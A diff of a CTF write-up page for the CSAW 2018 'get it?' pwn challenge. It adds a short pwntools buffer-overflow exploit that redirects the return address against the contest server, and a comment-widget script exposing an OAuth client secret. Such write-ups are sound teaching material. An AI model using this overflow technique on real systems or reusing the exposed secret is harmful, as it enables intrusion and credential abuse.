@@ -13,7 +13,7 @@
         <meta name="description" content="DF Team CTF writeups">
       
       
-        <link rel="canonical" href="https://A30lu5.github.io/blogs/CSAW-CTF-2018-Quals/pwn/get_it?/">
+        <link rel="canonical" href="https://A30lu5.github.io/blogs/CSAW-CTF-2018-Quals/pwn/get_it/writeup/">
       
       
         <meta name="author" content="DF Team">
@@ -37,18 +37,18 @@
       
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
-      <link rel="shortcut icon" href="../../..">
+      <link rel="shortcut icon" href="../../../..">
       <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.4">
     
     
       
-        <title>DF Team</title>
+        <title>get it? - DF Team</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.451f80e5.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
       
-        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.22915126.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
     
     
       
@@ -66,9 +66,9 @@
         <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
       
     
-    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
     
-      <link rel="stylesheet" href="../../../_static/css/extra.css">
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
     
     
   </head>
@@ -106,7 +106,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="../../../#title" tabindex="1" class="md-skip">
+      <a href="../../../../#get-it" tabindex="1" class="md-skip">
         跳转至
       </a>
     
@@ -132,7 +132,7 @@
                 DF Team
               </span>
               <span class="md-header-nav__topic">
-                Title
+                get it?
               </span>
             
           
@@ -213,7 +213,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../.." title="Introduction" class="md-tabs__link">
+        <a href="../../../.." title="Introduction" class="md-tabs__link">
           Introduction
         </a>
       
@@ -291,7 +291,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../.." title="Getting Started" class="md-nav__link">
+    <a href="../../../.." title="Getting Started" class="md-nav__link">
       Getting Started
     </a>
   </li>
@@ -341,7 +341,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../noxCTF2018/pwn/believeMe/writeup/" title="believe Me" class="md-nav__link">
+    <a href="../../../../noxCTF2018/pwn/believeMe/writeup/" title="believe Me" class="md-nav__link">
       believe Me
     </a>
   </li>
@@ -353,7 +353,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../noxCTF2018/pwn/TheNameCalculator/writeup/" title="The Name Calculator" class="md-nav__link">
+    <a href="../../../../noxCTF2018/pwn/TheNameCalculator/writeup/" title="The Name Calculator" class="md-nav__link">
       The Name Calculator
     </a>
   </li>
@@ -365,7 +365,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../noxCTF2018/pwn/GroceryList/writeup/" title="Grocery List" class="md-nav__link">
+    <a href="../../../../noxCTF2018/pwn/GroceryList/writeup/" title="Grocery List" class="md-nav__link">
       Grocery List
     </a>
   </li>
@@ -377,7 +377,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../noxCTF2018/pwn/TheBlackCanary/writeup/" title="The Black Canary" class="md-nav__link">
+    <a href="../../../../noxCTF2018/pwn/TheBlackCanary/writeup/" title="The Black Canary" class="md-nav__link">
       The Black Canary
     </a>
   </li>
@@ -415,6 +415,56 @@
     
   
   
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" title="Description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#points" title="Points" class="md-nav__link">
+    Points
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" title="Flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" title="Setup" class="md-nav__link">
+    Setup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -425,31 +475,41 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/A30lu5/blogs/blob/master/docs/CSAW-CTF-2018-Quals/pwn/get_it?/README.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/A30lu5/blogs/blob/master/docs/CSAW-CTF-2018-Quals/pwn/get_it/writeup.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h1>
-<p>get it?</p>
-<h1 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h1>
+                <h1 id="get-it">get it?<a class="headerlink" href="#get-it" title="Permanent link">&para;</a></h1>
+<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Do you get it?</li>
 </ul>
-<h1 id="points">Points<a class="headerlink" href="#points" title="Permanent link">&para;</a></h1>
+<h2 id="points">Points<a class="headerlink" href="#points" title="Permanent link">&para;</a></h2>
 <ul>
 <li>100</li>
 </ul>
-<h1 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h1>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
 <ul>
 <li>flag{y0u_deF_get_itls}</li>
 </ul>
-<h1 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h1>
+<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Make sure that competitors can connect to the challenge</li>
 </ul>
-<h1 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h1>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
 <ul>
 <li>super simple buffer overflow</li>
 </ul>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&quot;./get_it&quot;)</span>
+<span class="c1">#p = remote(&quot;localhost&quot;, 1437)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.chal.csaw.io&quot;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;??&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4005b6</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
                 
                   
                 
@@ -461,7 +521,27 @@
 <hr>
 
 <!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '708ce3b6562eb67f799f',
+        clientSecret: 'fa962a493d91e7d25852c1562cf3972825e0767e',
+        repo: 'blog_comment',
+        owner: 'DF-11A',
+        admin: ['4uuu', 'DF-11A'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
 
+    gitalk.render('gitalk-container')
+</script> 
               
             </article>
           </div>
@@ -494,32 +574,32 @@
       
     </div>
     
-      <script src="../../../assets/javascripts/application.a26c1c19.js"></script>
+      <script src="../../../../assets/javascripts/application.a26c1c19.js"></script>
       
         
         
           
-          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
           
             
               
-                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
               
               
-                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
               
             
           
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
       
-        <script src="../../../_static/js/extra.js"></script>
+        <script src="../../../../_static/js/extra.js"></script>
       
         <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
       
-        <script src="../../../search/main.js"></script>
+        <script src="../../../../search/main.js"></script>
       
     
     
